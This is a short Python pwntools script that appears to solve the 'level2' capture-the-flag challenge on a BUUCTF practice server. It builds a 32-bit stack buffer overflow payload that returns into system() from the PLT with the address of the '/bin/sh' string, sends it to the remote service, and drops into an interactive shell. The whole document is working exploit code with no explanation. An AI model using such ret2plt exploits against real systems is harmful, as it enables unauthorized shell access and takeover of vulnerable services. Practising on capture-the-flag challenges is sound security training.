from pwn import *
context.log_level = 'debug'
#io = process('./level2')
io = remote('node4.buuoj.cn',28696)

elf = ELF('./level2')

system_addr = elf.plt['system']
bin_sh_addr = next(elf.search(b'/bin/sh'))
payload = cyclic(0x88+4) + p32(system_addr) + cyclic(4) + p32(bin_sh_addr)

io.recv()
io.sendline(payload)
io.interactive()
